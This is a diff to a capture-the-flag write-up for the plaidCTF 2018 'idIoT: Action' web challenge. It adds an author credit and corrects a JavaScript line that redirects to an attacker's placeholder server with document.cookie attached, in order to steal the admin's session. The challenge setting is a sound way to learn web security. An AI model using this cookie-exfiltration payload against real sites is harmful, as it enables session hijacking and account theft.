@@ -1,5 +1,6 @@
 # idIoT: Action
-*plaidCTF 2018 Web 200*
+*plaidCTF 2018 Web 200*<br>
+*Writeup by Payload, KAIST GoN*
 
 
 ## Problem
@@ -53,7 +54,7 @@ Two steps are required to get a flag.
 Since we know how to execute javascript, stealing is easy. There are various ways to steal admin's clip.
 
 ```javascript
-location.href = <your server> + "?ck=" + "document.cookie"
+location.href = <your server> + "?ck=" + document.cookie;
 ```
 
 After we change our session to admin's session, we can see two clips.
